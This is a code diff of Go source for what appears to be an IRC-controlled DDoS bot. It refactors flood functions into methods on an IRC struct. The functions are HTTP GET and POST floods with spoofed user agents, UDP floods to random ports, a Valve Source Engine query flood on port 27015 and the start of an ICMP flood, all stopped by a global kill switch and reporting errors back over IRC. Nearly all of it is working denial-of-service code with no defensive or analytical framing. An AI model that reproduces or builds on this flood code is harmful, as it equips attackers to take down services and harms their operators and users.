@@ -15,7 +15,7 @@ import (
 
 var DDoS_Switch bool
 
-func GET(getTarget, set_chan string, reportIRC net.Conn) {
+func (irc *IRC) GET(getTarget string) {
 	agent_slice := []string{
 		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
 		"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
@@ -25,7 +25,7 @@ func GET(getTarget, set_chan string, reportIRC net.Conn) {
 	}
 	get_request, err := http.NewRequest("GET", getTarget+"/"+"user-agent", nil)
 	if err != nil {
-		IRC_Report(reportIRC, set_chan, err.Error())
+		irc.IRC_Report(err.Error())
 	}
 	_get := &http.Client{}
 
@@ -40,7 +40,7 @@ func GET(getTarget, set_chan string, reportIRC net.Conn) {
 	}
 }
 
-func POST(postTarget, set_chan string, reportIRC net.Conn) {
+func (irc *IRC) POST(postTarget string) {
 	buffer := make([]byte, 50)
 	reqBody, _ := json.Marshal(map[string]string{
 		"email":    string(buffer),
@@ -49,7 +49,7 @@ func POST(postTarget, set_chan string, reportIRC net.Conn) {
 	})
 	post_request, err := http.NewRequest("POST", postTarget+"/"+string(reqBody), nil)
 	if err != nil {
-		IRC_Report(reportIRC, set_chan, err.Error())
+		irc.IRC_Report(err.Error())
 	}
 	_post := &http.Client{}
 
@@ -61,43 +61,43 @@ func POST(postTarget, set_chan string, reportIRC net.Conn) {
 	}
 }
 
-func udp_packetCraft(udpTarget, set_chan, port string, buffer []byte, reportIRC net.Conn) {
+func (irc *IRC) udp_packetCraft(udpTarget, port string, buffer []byte) {
 	udp, err := net.Dial("udp", udpTarget+":"+port)
 	if err != nil {
-		IRC_Report(reportIRC, set_chan, err.Error())
+		irc.IRC_Report(err.Error())
 	}
 	udp.Write(buffer)
 	udp.Close()
 }
 
-func DUDP(udpTarget, size, set_chan string, reportIRC net.Conn) {
+func (irc *IRC) DUDP(udpTarget, size string) {
 	for {
 		_size, _ := strconv.Atoi(size)
 		if _size <= 0 || _size > 700 {
 			_size = 700
 		}
 		dudpbuff := make([]byte, _size)
-		udp_packetCraft(udpTarget, set_chan, fmt.Sprint(rand.Intn(65535)), dudpbuff, reportIRC)
+		irc.udp_packetCraft(udpTarget, fmt.Sprint(rand.Intn(65535)), dudpbuff)
 		if DDoS_Switch {
 			break
 		}
 	}
 }
 
-func VSE(vseTarget, set_chan string, reportIRC net.Conn) {
+func (irc *IRC) VSE(vseTarget string) {
 	for {
 		vsebuff := []byte("TSource Engine Query")
-		udp_packetCraft(vseTarget, set_chan, "27015", vsebuff, reportIRC)
+		irc.udp_packetCraft(vseTarget, "27015", vsebuff)
 		if DDoS_Switch {
 			break
 		}
 	}
 }
 
-func ICMP(icmpTarget, set_chan string, reportIRC net.Conn) {
+func (irc *IRC) ICMP(icmpTarget string) {
 	conn, err := icmp.ListenPacket("udp4", "0.0.0.0")
 	if err != nil {
-		IRC_Report(reportIRC, set_chan, err.Error())
+		irc.IRC_Report(err.Error())
 	}
 	defer conn.Close()
 
